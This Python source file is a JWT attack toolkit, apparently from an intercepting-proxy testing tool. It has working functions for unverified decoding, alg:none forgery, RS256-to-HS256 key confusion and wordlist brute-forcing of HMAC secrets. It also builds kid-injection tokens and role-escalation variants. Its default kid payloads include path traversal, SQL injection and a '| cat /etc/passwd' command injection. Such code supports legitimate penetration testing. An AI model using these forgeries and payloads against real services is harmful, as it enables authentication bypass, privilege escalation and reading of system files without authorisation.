"""
JWT attack toolkit:
  - decode (no verification)
  - alg:none forgery
  - HMAC brute-force (wordlist)
  - RS256 → HS256 confusion
  - kid injection payloads
  - role escalation variants
"""
import asyncio
import base64
import hashlib
import hmac
import json
import re
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any

import structlog

logger = structlog.get_logger()

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*")

_EXECUTOR = ThreadPoolExecutor(max_workers=4)


# ── Helpers ──────────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _split_jwt(token: str) -> tuple[str, str, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a valid JWT (expected 3 parts)")
    return parts[0], parts[1], parts[2]


# ── Core functions ────────────────────────────────────────────────────────────

def decode_jwt(token: str) -> dict:
    """Decode header and payload without verification."""
    h, p, _ = _split_jwt(token)
    header = json.loads(_b64url_decode(h))
    payload = json.loads(_b64url_decode(p))
    return {"header": header, "payload": payload}


def forge_alg_none(token: str) -> str:
    """Produce an alg:none variant — empty signature."""
    _, p, _ = _split_jwt(token)
    new_header = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    return f"{new_header}.{p}."


def rs256_to_hs256(token: str, public_key_pem: str) -> str:
    """Sign the token using the server's public key as the HMAC secret."""
    _, p, _ = _split_jwt(token)
    new_header = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    signing_input = f"{new_header}.{p}".encode()
    key = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return f"{new_header}.{p}.{_b64url_encode(sig)}"


def test_kid_injection(token: str, payloads: list[str] | None = None) -> list[str]:
    """Return forged tokens with injected kid values."""
    if payloads is None:
        payloads = [
            "../../../../dev/null",
            "/dev/null",
            "' OR 1=1--",
            "../../../proc/self/fd/0",
            "| cat /etc/passwd",
        ]
    _, p, _ = _split_jwt(token)
    results = []
    for kid in payloads:
        hdr = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid}).encode())
        signing_input = f"{hdr}.{p}".encode()
        sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
        results.append(f"{hdr}.{p}.{_b64url_encode(sig)}")
    return results


def escalate_roles(
    token: str,
    role_fields: list[str] | None = None,
    escalation_values: list[Any] | None = None,
) -> list[str]:
    """Produce variants with elevated role claims."""
    if role_fields is None:
        role_fields = ["role", "admin", "is_admin", "isAdmin", "roles", "scope"]
    if escalation_values is None:
        escalation_values = ["admin", "administrator", True, 1, "superuser", "root"]

    h, p, _ = _split_jwt(token)
    payload = json.loads(_b64url_decode(p))
    results = []
    for field in role_fields:
        for value in escalation_values:
            new_payload = dict(payload)
            new_payload[field] = value
            new_p = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
            # Use alg:none so the server (if vulnerable) accepts it
            new_h = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
            results.append(f"{new_h}.{new_p}.")
    return results


def _brute_force_sync(token: str, wordlist_path: str, progress_queue: asyncio.Queue | None) -> dict:
    """Blocking brute-force; run in executor."""
    h, p, sig_b64 = _split_jwt(token)
    signing_input = f"{h}.{p}".encode()
    expected_sig = _b64url_decode(sig_b64)

    count = 0
    loop = None
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        pass

    def _push(msg: dict):
        if progress_queue and loop:
            try:
                loop.call_soon_threadsafe(progress_queue.put_nowait, msg)
            except Exception:
                pass

    wl = Path(wordlist_path)
    if not wl.exists():
        return {"found": False, "secret": None, "tested_count": 0, "error": "Wordlist not found"}

    with open(wl, "r", errors="replace") as f:
        for line in f:
            secret = line.rstrip("\n")
            candidate = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            count += 1
            if candidate == expected_sig:
                _push({"type": "brute_found", "secret": secret, "tested_count": count})
                return {"found": True, "secret": secret, "tested_count": count}
            if count % 10_000 == 0:
                _push({"type": "brute_progress", "tested_count": count})

    _push({"type": "brute_done", "tested_count": count})
    return {"found": False, "secret": None, "tested_count": count}


async def brute_force_hmac(
    token: str, wordlist_path: str, progress_queue: asyncio.Queue | None = None
) -> dict:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        _EXECUTOR, _brute_force_sync, token, wordlist_path, progress_queue
    )


def scan_flows_for_jwts(flows: list[Any]) -> list[str]:
    """Extract unique JWT strings from a list of ProxyFlow ORM objects."""
    found: set[str] = set()
    for flow in flows:
        for field in (flow.request_headers, flow.response_body):
            if not field:
                continue
            text = field if isinstance(field, str) else field.decode(errors="replace")
            for match in _JWT_RE.finditer(text):
                found.add(match.group(0))
    return list(found)
